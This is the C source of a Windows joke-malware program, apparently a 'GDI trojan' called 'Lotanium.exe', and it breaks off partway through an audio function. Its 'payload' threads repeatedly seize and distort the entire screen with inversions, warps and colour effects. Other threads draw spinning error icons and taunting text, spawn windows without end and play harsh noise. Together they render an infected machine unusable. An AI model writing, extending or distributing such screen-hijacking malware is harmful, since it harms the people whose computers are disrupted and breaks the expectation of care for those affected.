typedef struct IUnknown IUnknown;
#include <math.h>
#include <stdint.h>
#include <windows.h>
#define _CRT_SECURE_NO_WARNINGS   
#define WIN32_LEAN_AND_MEAN  
#include <wincrypt.h>
#include <stdio.h>
#include <stdbool.h>
#include <time.h>
#define PAY 3.141592653
struct V3 { float x, y, z; };
struct P2 { int x, y; };
float gAngle = 0.0f;
float gDir = 0.001f;
#pragma comment(lib, "Msimg32.lib")
#pragma comment(lib, "winmm.lib")
HINSTANCE gInst;
int gw, gh;

HDC gScreenDC;
HDC gMemDC;
HDC gTempDC;
HDC gRotDC;

HBITMAP gMemBmp;
HBITMAP gTempBmp;
HBITMAP gRotBmp;

void* gMemBits;
void* gTempBits;
void* gRotBits;

typedef struct {
    float h;
    float s;
    float l;
} HSL;

float x = 300, y = 300;
float vx = 4, vy = 3;
int maxr = 80;


float smoothstep(float a, float b, float x) {
    float t = (x - a) / (b - a);
    if (t < 0)t = 0;
    if (t > 1)t = 1;
    return t * t * (3 - 2 * t);
}


float hue2rgb(float p, float q, float t)
{
    if (t < 0.0f) t += 1.0f;
    if (t > 1.0f) t -= 1.0f;
    if (t < 1.0f / 6.0f) return p + (q - p) * 6.0f * t;
    if (t < 1.0f / 2.0f) return q;
    if (t < 2.0f / 3.0f) return p + (q - p) * (2.0f / 3.0f - t) * 6.0f;
    return p;
}


HSL rgb2hsl(RGBQUAD px) {
    HSL out;
    float R = px.rgbRed / 255.0f;
    float G = px.rgbGreen / 255.0f;
    float B = px.rgbBlue / 255.0f;

    float maxv = fmaxf(R, fmaxf(G, B));
    float minv = fminf(R, fminf(G, B));
    float delta = maxv - minv;

    out.l = (maxv + minv) * 0.5f;

    if (delta < 0.00001f) {
        out.h = 0.0f;
        out.s = 0.0f;
        return out;
    }

    out.s = (out.l < 0.5f)
        ? (delta / (maxv + minv))
        : (delta / (2.0f - maxv - minv));

    if (maxv == R)
        out.h = (G - B) / delta;
    else if (maxv == G)
        out.h = 2.0f + (B - R) / delta;
    else
        out.h = 4.0f + (R - G) / delta;

    out.h *= 60.0f;
    if (out.h < 0.0f) out.h += 360.0f;

    return out;
}

void HSLtoRGB(float H, float S, float L, int* r, int* g, int* b) {
    float R, G, B;

    H = fmodf(H, 360.0f);
    if (H < 0.0f) H += 360.0f;
    H /= 360.0f;

    if (S <= 0.0f) {
        R = G = B = L;
    }
    else {
        float q = (L < 0.5f) ? (L * (1.0f + S)) : (L + S - L * S);
        float p = 2.0f * L - q;

        R = hue2rgb(p, q, H + 1.0f / 3.0f);
        G = hue2rgb(p, q, H);
        B = hue2rgb(p, q, H - 1.0f / 3.0f);
    }

    *r = (int)(R * 255.0f);
    *g = (int)(G * 255.0f);
    *b = (int)(B * 255.0f);
}

RGBQUAD hsl2rgb(HSL hsl) {
    int r, g, b;
    HSLtoRGB(hsl.h, hsl.s, hsl.l, &r, &g, &b);

    RGBQUAD out;
    out.rgbRed = (BYTE)r;
    out.rgbGreen = (BYTE)g;
    out.rgbBlue = (BYTE)b;
    out.rgbReserved = 0;
    return out;
}

LRESULT CALLBACK WndProc2(HWND h, UINT m, WPARAM w, LPARAM l)
{
    if (m == WM_DESTROY) PostQuitMessage(0);
    return DefWindowProc(h, m, w, l);
}

typedef struct
{
    float x;
    float y;
    float z;
} VERTEX;

typedef struct
{
    int vtx0;
    int vtx1;
} EDGE;

DWORD WINAPI aqe(LPVOID lpThread)
{
    BitBlt(gRotDC, 0, 0, gw, gh, gMemDC, 0, 0, SRCCOPY);

    float cx = gw * 0.5f;
    float cy = gh * 0.5f;

    float s = sinf(gAngle);
    float c = cosf(gAngle);

    POINT p[3];

    float x0 = -cx, y0 = -cy;
    float x1 = cx, y1 = -cy;
    float x2 = -cx, y2 = cy;

    float rx0 = x0 * c - y0 * s + cx;
    float ry0 = x0 * s + y0 * c + cy;
    float rx1 = x1 * c - y1 * s + cx;
    float ry1 = x1 * s + y1 * c + cy;
    float rx2 = x2 * c - y2 * s + cx;
    float ry2 = x2 * s + y2 * c + cy;

    p[0].x = (LONG)rx0; p[0].y = (LONG)ry0;
    p[1].x = (LONG)rx1; p[1].y = (LONG)ry1;
    p[2].x = (LONG)rx2; p[2].y = (LONG)ry2;

    PlgBlt(gMemDC, p, gRotDC, 0, 0, gw, gh, NULL, 0, 0);

    return 0;
}

DWORD WINAPI icon(LPVOID lpParam) {
    HICON ico = LoadIcon(NULL, IDI_WARNING);

    V3 v[8] =
    {
        {-1,-1,-1},{1,-1,-1},{1,1,-1},{-1,1,-1},
        {-1,-1, 1},{1,-1, 1},{1,1, 1},{-1,1, 1}
    };

    float cx = 400.0f, cy = 300.0f;
    float vx = 4.0f, vy = 3.0f;
    float ang = 0.0f;

    while (1)
    {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        cx += vx;
        cy += vy;
        if (cx < 80 || cx > sw - 80) vx = -vx;
        if (cy < 80 || cy > sh - 80) vy = -vy;

        ang += 0.04f;

        float c1 = cosf(ang), s1 = sinf(ang);
        float c2 = cosf(ang * 0.7f), s2 = sinf(ang * 0.7f);

        P2 p[8];

        for (int i = 0; i < 8; i++)
        {
            float x = v[i].x, y = v[i].y, z = v[i].z;
            float y1 = y * c2 - z * s2;
            float z1 = y * s2 + z * c2;
            float x1 = x * c1 - z1 * s1;
            float z2 = x * s1 + z1 * c1;
            float f = 3.0f / (3.0f + z2);
            p[i].x = (int)(cx + x1 * 32 * f);
            p[i].y = (int)(cy + y1 * 32 * f);
        }

        for (int i = 0; i < 8; i++)
            DrawIcon(hdc, p[i].x - 16, p[i].y - 16, ico);

        ReleaseDC(0, hdc);
        Sleep(10);
    }

    return 0;
}

DWORD WINAPI textout(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hcdc = CreateCompatibleDC(hdc);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    LPCSTR text[] = {
        "Lotanium.exe",
        "susnix/cattyx0r/x0anix",
        "the parasite is finally here...",
        "''add a #include <noskidtan>'' - crzxymint",
        "'im deadass pissed' - crzxymint",
        "''sigma bitch'' - sapphiretech2"
    };

    while (1)
    {
        HDC hdc = GetDC(NULL);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);

        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        int m = rand() % 255;
        SetTextColor(hdc, RGB(m, m, m));
        SetBkColor(hdc, RGB(-m, -m, -m));

        HFONT font = CreateFontA(40, 20, 50 - rand() % 100, 0, FW_DONTCARE, 0, true, 0, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, FF_DONTCARE, "Arial");
        SelectObject(hcdc, font);

        int tmp = rand() % 6;
        TextOutA(hcdc, rand() % w, rand() % h, text[tmp], lstrlenA(text[tmp]));

        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteObject(font);
        DeleteObject(hBitmap);
        Sleep(5);
    }
}

DWORD WINAPI icon2(LPVOID lpParam) {
    HICON ico = LoadIcon(NULL, IDI_ERROR);

    V3 v[8] =
    {
        {-1,-1,-1},{1,-1,-1},{1,1,-1},{-1,1,-1},
        {-1,-1, 1},{1,-1, 1},{1,1, 1},{-1,1, 1}
    };

    float cx = 400.0f, cy = 300.0f;
    float vx = 4.0f, vy = 3.0f;
    float ang = 0.0f;

    while (1)
    {
        HDC hdc = GetDC(0);
        int sw = GetSystemMetrics(SM_CXSCREEN);
        int sh = GetSystemMetrics(SM_CYSCREEN);

        cx += vx;
        cy += vy;
        if (cx < 80 || cx > sw - 80) vx = -vx;
        if (cy < 80 || cy > sh - 80) vy = -vy;

        ang += 0.04f;

        float c1 = tanf(ang), s1 = tanf(ang);
        float c2 = tanf(ang * 0.7f), s2 = tanf(ang * 5.0f);

        P2 p[8];

        for (int i = 0; i < 8; i++)
        {
            float x = v[i].x, y = v[i].y, z = v[i].z;
            float y1 = y * c2 - z * s2;
            float z1 = y * s2 + z * c2;
            float x1 = x * c1 - z1 * s1;
            float z2 = x * s1 + z1 * c1;
            float f = 5.0f / (5.0f + z2);
            p[i].x = (int)(cx + x1 * 60 * f);
            p[i].y = (int)(cy + y1 * 60 * f);
        }

        for (int i = 0; i < 8; i++)
            DrawIcon(hdc, p[i].x - 16, p[i].y - 16, ico);

        ReleaseDC(0, hdc);
        Sleep(10);
    }

    return 0;
}

DWORD WINAPI tHSL(LPVOID lpThread) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = i * (sin((x + (i ^ 20)) / 100.f) + sin((y + (i ^ 20)) / 100.f));

                rgbquadCopy = rgbquad[index];

                hslcolor = rgb2hsl(rgbquadCopy);
                hslcolor.h *= fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                hslcolor.s += 1.f;
                hslcolor.l += 0.1f;

                rgbquad[index] = hsl2rgb(hslcolor);
            }
        }

        i++;

        StretchBlt(hdc, 10, 0, screenWidth - 30, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCAND);
        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI payloadRO(LPVOID lpParam) {
    HDC sdc = GetDC(0);
    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    BITMAPINFO bi;
    ZeroMemory(&bi, sizeof(bi));
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = sw;
    bi.bmiHeader.biHeight = -sh;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    void* bits;
    HBITMAP dib = CreateDIBSection(sdc, &bi, DIB_RGB_COLORS, &bits, NULL, 0);
    HDC mdc = CreateCompatibleDC(sdc);
    SelectObject(mdc, dib);

    srand(GetTickCount());

    while (1) {
        BitBlt(mdc, 0, 0, sw, sh, sdc, 0, 0, SRCCOPY);

        RGBQUAD* px = (RGBQUAD*)bits;
        int count = sw * sh;
        for (int i = 0; i < count; i++) {
            BYTE r = px[i].rgbRed;
            BYTE g = px[i].rgbGreen;
            BYTE b = px[i].rgbBlue;
            px[i].rgbRed = (BYTE)((g + rand() % 32) & 0xFF);
            px[i].rgbGreen = (BYTE)((b + rand() % 32) & 0xFF);
            px[i].rgbBlue = (BYTE)((r + rand() % 32) & 0xFF);
        }

        int ox = (rand() % 21) - 10;
        int oy = (rand() % 21) - 10;
        BitBlt(sdc, ox, oy, sw - abs(ox), sh - abs(oy), mdc, 0, 0, NOTSRCCOPY);


        HBRUSH br = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
        HBRUSH old = (HBRUSH)SelectObject(sdc, br);
        SelectObject(sdc, old);
        DeleteObject(br);

        Sleep(1);
    }

    DeleteDC(mdc);
    DeleteObject(dib);
    ReleaseDC(0, sdc);
    return 0;
}

DWORD WINAPI warp(LPVOID lpThread) {
    int W = GetSystemMetrics(SM_CXSCREEN);
    int H = GetSystemMetrics(SM_CYSCREEN);

    HDC screen = GetDC(NULL);
    HDC memdc = CreateCompatibleDC(screen);
    HBITMAP bmp = CreateCompatibleBitmap(screen, W, H);
    SelectObject(memdc, bmp);

    float t = 0;

    while (1)
    {
        BitBlt(memdc, 0, 0, W, H, screen, 0, 0, SRCCOPY);

        for (int y = 0; y < H; y++)
        {
            float warp = sinf(y * 0.06f + t) * 20.0f;

            BitBlt(
                screen,
                (int)warp, y, W, 1,
                memdc,
                0, y,
                SRCCOPY
            );
        }

        t += 0.05f;
        Sleep(1);
    }
}

DWORD WINAPI GDIX0R(LPVOID lpThread) {

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    int rw = screenW / 5;
    int rh = screenH / 5;

    HDC hdc = GetDC(NULL);
    HDC mem = CreateCompatibleDC(hdc);

    BITMAPINFO bi = { 0 };
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = rw;
    bi.bmiHeader.biHeight = -rh;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    RGBQUAD* px = NULL;
    HBITMAP bmp = CreateDIBSection(hdc, &bi, DIB_RGB_COLORS, (void**)&px, NULL, 0);

    if (!bmp)
        bmp = CreateCompatibleBitmap(hdc, rw, rh);

    SelectObject(mem, bmp);

    int t = 0;

    while (1) {

        StretchBlt(
            mem,
            0, 0, rw, rh,
            hdc,
            0, 0, screenW, screenH,
            SRCAND
        );


        for (int y = 0; y < rh; y++) {
            for (int x = 0; x < rw; x++) {

                int idx = y * rw + x;


                RGBQUAD old = px[idx];


                int v = ((x * y | t) & 255);

                RGBQUAD neo;
                neo.rgbRed = 165 - v;
                neo.rgbGreen = (BYTE)(v * 0.3f);
                neo.rgbBlue = 255 - v;


                float a = 0.35f;

                px[idx].rgbRed = (BYTE)(old.rgbRed * (1 - a) + neo.rgbRed * a);
                px[idx].rgbGreen = (BYTE)(old.rgbGreen * (1 - a) + neo.rgbGreen * a);
                px[idx].rgbBlue = (BYTE)(old.rgbBlue * (1 - a) + neo.rgbBlue * a);
            }
        }


        StretchBlt(
            hdc,
            0, 0, screenW, screenH,
            mem,
            0, 0, rw, rh,
            SRCAND
        );

        t++;
        Sleep(1);
    }

    return 0;
}

DWORD WINAPI payload4(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(0);
    int x = rand() % w;
    int y = rand() % h;
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    float sine = 0.f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = i ^ (x ^ y) + ((x ^ y) * 3);

                rgbquadCopy = rgbquad[index];

                hslcolor = rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 4000.f + y / screenHeight * .2f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l += 0.1f;

                rgbquad[index] = hsl2rgb(hslcolor);
            }
        }

        i++;
        sine += 1.f;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCPAINT);
        for (int x = 0; x < h; x++) {
            int offset = (10 * tan(sine + x * 0.001f));
            BitBlt(hdc, 0, x, w, 1, hdcCopy, offset, x, SRCCOPY);
        }

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCAND);
        for (int y = 0; y < w; y++) {
            int offset = (10 * tan(sine + y * 0.001f));
            BitBlt(hdc, y, 0, 1, h, hdcCopy, y, offset, SRCCOPY);
        }

        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI payload5(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(0);
    int x = rand() % w;
    int y = rand() % h;
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    float sine = 0.f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = i * (x | y) + ((x | y) * 3);

                rgbquadCopy = rgbquad[index];

                hslcolor = rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 4000.f + y / screenHeight * .2f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l += 0.1f;

                rgbquad[index] = hsl2rgb(hslcolor);
            }
        }

        i++;
        sine += 3.2f;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCAND);
        for (int x = 0; x < h; x++) {
            int offset = (10 * sin(sine + x * 0.01f));
            BitBlt(hdc, 0, x, w, 1, hdcCopy, offset, x, SRCCOPY);
        }

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCAND);
        for (int y = 0; y < w; y++) {
            int offset = (10 * cos(sine + y * 0.01f));
            BitBlt(hdc, y, 0, 1, h, hdcCopy, y, offset, SRCCOPY);
        }

        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI payload6(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(0);
    int x = rand() % w;
    int y = rand() % h;
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    float sine = 0.f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = i * (x * y) + ((x * y) * 3);

                rgbquadCopy = rgbquad[index];

                hslcolor = rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 4000.f + y / screenHeight * .2f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l += 0.1f;

                rgbquad[index] = hsl2rgb(hslcolor);
            }
        }

        i++;
        sine += 3.2f;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCPAINT);
        for (int x = 0; x < h; x++) {
            int offset = (10 * sin(sine + x * 0.01f));
            BitBlt(hdc, 0, x, w, 1, hdcCopy, offset, x, NOTSRCCOPY);
        }

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCPAINT);
        for (int y = 0; y < w; y++) {
            int offset = (10 * tan(sine + y * 0.01f));
            BitBlt(hdc, y, 0, 1, h, hdcCopy, y, offset, NOTSRCCOPY);
        }

        ReleaseDC(NULL, hdc);
    }
}

DWORD WINAPI payload7(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(0);
    int x = rand() % w;
    int y = rand() % h;
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;

    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;


    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;

    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);

    INT i = 0;
    float sine = 0.f;

    while (1)
    {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);

        RGBQUAD rgbquadCopy;

        for (int x = 0; x < screenWidth; x++)
        {
            for (int y = 0; y < screenHeight; y++)
            {
                int index = y * screenWidth + x;

                int fx = i ^ (x | y) + ((x * y) * 3);

                rgbquadCopy = rgbquad[index];

                hslcolor = rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 4000.f + y / screenHeight * .2f, 1.f);
                hslcolor.s = 1.f;
                hslcolor.l += 0.1f;

                rgbquad[index] = hsl2rgb(hslcolor);
            }
        }

        i++;
        sine += 3.2f;

        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCAND);
        for (int x = 0; x < h; x++) {
            int offset = (10 * sin(sine + x * 0.01f));
            BitBlt(hdc, 0, x, w, 1, hdcCopy, offset, x, SRCCOPY);
        }

        BitBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, SRCAND);
        for (int y = 0; y < w; y++) {
            int offset = (10 * sin(sine + y * 0.01f));
            BitBlt(hdc, y, 0, 1, h, hdcCopy, y, offset, SRCCOPY);
        }

        ReleaseDC(NULL, hdc);
    }
}


DWORD WINAPI payloadspam1(LPVOID lpParam)
{
    HINSTANCE h = GetModuleHandle(0);

    WNDCLASSA wc = { 0 };
    wc.lpfnWndProc = WndProc2;
    wc.hInstance = h;
    wc.lpszClassName = "dor";
    RegisterClassA(&wc);

    srand((unsigned)time(0));

    int sw = GetSystemMetrics(SM_CXSCREEN);
    int sh = GetSystemMetrics(SM_CYSCREEN);

    MSG msg;

    for (;;)
    {
        int x = rand() % (sw - 500);
        int y = rand() % (sh - 500);

        HWND w = CreateWindowExA(
            0,
            "dor",
            "",
            WS_OVERLAPPEDWINDOW | WS_VISIBLE,
            x,
            y,
            45,
            500,
            0,
            0,
            h,
            0
        );

        Sleep(rand() % 5000);


        while (PeekMessage(&msg, 0, 0, 0, PM_REMOVE))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return 0;
}

VOID WINAPI Audio() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = (t * rand());

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI Audio2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 9500, 9500, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[9500 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = (((t * (t >> 8 | t >> 41)) << (17 & t >> 20)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI Audio3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 9500, 9500, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[9500 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = (((t * (t >> 8 | t))));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI Audio4or1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 48000, 48000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[48000 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = t * rand();

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI Audio4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 9500, 9500, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[9500 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = t * t >> (t & t >> 6) / 12;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI Audio5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 9500, 9500, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[9500 * 30];
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = t | t >> (t & t >> 8) / 3;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI Audio6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 9500, 9500, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
